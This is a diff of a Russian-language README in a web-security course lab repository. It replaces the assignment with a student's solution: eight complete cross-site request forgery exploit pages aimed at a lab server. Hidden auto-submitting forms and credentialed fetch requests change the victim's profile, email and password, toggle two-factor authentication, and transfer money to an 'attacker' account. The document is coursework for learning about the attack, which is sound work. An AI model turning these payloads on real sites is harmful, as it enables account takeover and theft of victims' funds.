@@ -1,78 +1,241 @@
-# CSRF инъекция
+## CSRF эксплоиты
 
-Написание CSRF эксплоитов
+Все примеры рассчитаны на то, что жертва **авторизована** на сайте `http://5.129.245.211:5000` (куки/сессия уже есть в браузере жертвы).  
+Ниже — по одному эксплоиту на каждый эндпоинт. Для HTML‑форм используется автосабмит при загрузке страницы, для JSON‑эндпоинтов — `fetch` с `credentials: 'include'`.
 
-## Цели работы:
+---
 
-Написать по 1 эксплоиту под каждый эндпоинт (необходимо использовать как JS, так и подход через форму)
+## Эксплоиты через HTML‑формы
 
-### Эндпоинты
-
-- `/update-profile` — Методы: GET, POST — Аутентификация: требуется (session `user_id`) — POST (form): `email`, `phone`, `address`, `bio`
-
-- `/update-preferences` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (form): `status` (по умолчанию `standard`)
-
-- `/change-password` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (form): `new_password`
-
-- `/toggle-2fa` — Метод: POST — Аутентификация: требуется (session `user_id`) — Параметры/тело: нет
-
-- `/transfer` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (form): `amount`, `target_user`, `comment` (опц.)
-
-- `/add-funds` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (form): `amount`
-
-- `/api/update-email` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (JSON): `{ "email": "<email>" }`
-
-- `/api/transfer` — Метод: POST — Аутентификация: требуется (session `user_id`) — POST (JSON): `{ "amount": <number>, "target_user": "<username>" }`
-
-## Ресурс
-
-[Сайт](http://5.129.245.211:5000/)
-
-## Сдача
-
-Создайте форк репозитория `websec-lab-csrf-{ваша_фамилия}` в организацию `41ISR`, работайте в ветке `dev`. Удалите содержимое файла `README.md` и работайте в нем же. По завершению работы сделайте пулл реквест `dev` => `main` и отметьте [меня](https://github.com/ktkv419) ревьювером
-
-## Подсказки
-
-- [Презентация](https://ktkv-presentations.github.io/websec-5/)
-
-### Пример эксплоита через форму
+### 1. `/update-profile` (изменение профиля жертвы)
 
 ```html
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>...</title>
+    <meta charset="UTF-8">
+    <title>CSRF /update-profile</title>
 </head>
 <body>
-    <form id="csrf-form" 
-          action="http://localhost:5000/update-profile" 
-          method="POST" 
+    <form id="csrf-update-profile"
+          action="http://5.129.245.211:5000/update-profile"
+          method="POST"
           style="display:none;">
-        <input type="text" name="email" value="ayylmao@r.r">
+        <input type="email"   name="email"   value="owned@example.com">
+        <input type="text"    name="phone"   value="+79990000000">
+        <input type="text"    name="address" value="Evil Street 13">
+        <input type="text"    name="bio"     value="I was pwned via CSRF">
     </form>
-    
+
     <script>
-        window.onload = function() {
-            document.getElementById('csrf-form').submit();
+        window.onload = function () {
+            document.getElementById('csrf-update-profile').submit();
         };
     </script>
 </body>
 </html>
-
 ```
 
-### Пример эксплоита через JS
+---
 
-```javascript
-        fetch('http://localhost:5000/api/update-email', {
-            method: 'POST',
-            credentials: 'include', // Отправляет cookies автоматически
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                email: 'hacker@evil.com'
-            })
-        }).catch(() => {});
+### 2. `/update-preferences` (повышение статуса)
+
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF /update-preferences</title>
+</head>
+<body>
+    <form id="csrf-update-preferences"
+          action="http://5.129.245.211:5000/update-preferences"
+          method="POST"
+          style="display:none;">
+        <input type="text" name="status" value="premium">
+    </form>
+
+    <script>
+        window.onload = function () {
+            document.getElementById('csrf-update-preferences').submit();
+        };
+    </script>
+</body>
+</html>
+```
+
+---
+
+### 3. `/change-password` (смена пароля жертвы)
+
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF /change-password</title>
+</head>
+<body>
+    <form id="csrf-change-password"
+          action="http://5.129.245.211:5000/change-password"
+          method="POST"
+          style="display:none;">
+        <input type="password" name="new_password" value="P@wned123!">
+    </form>
+
+    <script>
+        window.onload = function () {
+            document.getElementById('csrf-change-password').submit();
+        };
+    </script>
+</body>
+</html>
+```
+
+---
+
+### 4. `/toggle-2fa` (включение/выключение 2FA)
+
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF /toggle-2fa</title>
+</head>
+<body>
+    <form id="csrf-toggle-2fa"
+          action="http://5.129.245.211:5000/toggle-2fa"
+          method="POST"
+          style="display:none;">
+        <!-- Тело пустое, сервер использует только сессию -->
+    </form>
+
+    <script>
+        window.onload = function () {
+            document.getElementById('csrf-toggle-2fa').submit();
+        };
+    </script>
+</body>
+</html>
+```
+
+---
+
+### 5. `/transfer` (перевод денег на счёт атакующего)
+
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF /transfer</title>
+</head>
+<body>
+    <form id="csrf-transfer"
+          action="http://5.129.245.211:5000/transfer"
+          method="POST"
+          style="display:none;">
+        <input type="number" name="amount"      value="1000">
+        <input type="text"   name="target_user" value="attacker">
+        <input type="text"   name="comment"     value="Thanks for nothing">
+    </form>
+
+    <script>
+        window.onload = function () {
+            document.getElementById('csrf-transfer').submit();
+        };
+    </script>
+</body>
+</html>
+```
+
+---
+
+### 6. `/add-funds` (пополнение счёта на заранее заданную сумму)
+
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF /add-funds</title>
+</head>
+<body>
+    <form id="csrf-add-funds"
+          action="http://5.129.245.211:5000/add-funds"
+          method="POST"
+          style="display:none;">
+        <input type="number" name="amount" value="5000">
+    </form>
+
+    <script>
+        window.onload = function () {
+            document.getElementById('csrf-add-funds').submit();
+        };
+    </script>
+</body>
+</html>
+```
+
+---
+
+## Эксплоиты через JavaScript (JSON API)
+
+Ниже — примеры скриптов, которые можно встроить на стороннюю страницу (например, в `<script>`), либо загрузить через XSS.  
+Важно, чтобы домен злоумышленника был в той же вкладке/браузере, где жертва уже авторизована на `http://5.129.245.211:5000`.
+
+### 7. `/api/update-email`
+
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF /api/update-email</title>
+</head>
+<body>
+<script>
+    fetch('http://5.129.245.211:5000/api/update-email', {
+        method: 'POST',
+        credentials: 'include', // отправляет cookies жертвы
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            email: 'attacker-control@example.com'
+        })
+    }).catch(() => {});
+</script>
+</body>
+</html>
+```
+
+---
+
+### 8. `/api/transfer`
+
+```html
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF /api/transfer</title>
+</head>
+<body>
+<script>
+    fetch('http://5.129.245.211:5000/api/transfer', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            amount: 1500,
+            target_user: 'attacker'
+        })
+    }).catch(() => {});
+</script>
+</body>
+</html>
 ```
